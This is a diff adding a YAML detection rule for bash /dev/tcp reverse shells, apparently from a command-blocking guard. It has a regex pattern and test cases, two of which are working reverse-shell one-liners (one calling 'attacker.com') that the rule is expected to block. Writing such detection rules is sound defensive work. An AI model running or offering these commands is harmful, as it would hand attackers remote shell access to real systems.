@@ -1,0 +1,25 @@
+# Mozilla 0din probe — data exfiltration / call-home category
+# Source: https://0din.ai/research/taxonomy/techniques
+# Apache 2.0 — attribution: Mozilla 0din (0din.ai)
+#
+# Bash /dev/tcp reverse shell: a classic "call home" pattern where bash
+# opens a TCP connection back to an attacker-controlled host and redirects
+# stdin/stdout/stderr. Complementary to existing nc -e patterns.
+
+id: ODIN-2024-003
+source: https://0din.ai/research/taxonomy/techniques
+disclosed: 2024-08-01
+risk_level: critical
+shell_specific: bash
+pattern: "bash\\s+-[iI]\\s+>&\\s*/dev/tcp/|/bin/bash\\s+-[iI]\\s+>&\\s*/dev/tcp/"
+description: "[0din:data-exfiltration] Bash /dev/tcp reverse shell — unauthorized TCP call-home connection"
+
+test_cases:
+  - input: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+    expected_behavior: Block
+  - input: "/bin/bash -i >& /dev/tcp/attacker.com/9001 0>&1"
+    expected_behavior: Block
+  - input: "bash -i"
+    expected_behavior: Allow
+  - input: "cat /dev/tcp/hostname/port"
+    expected_behavior: Allow
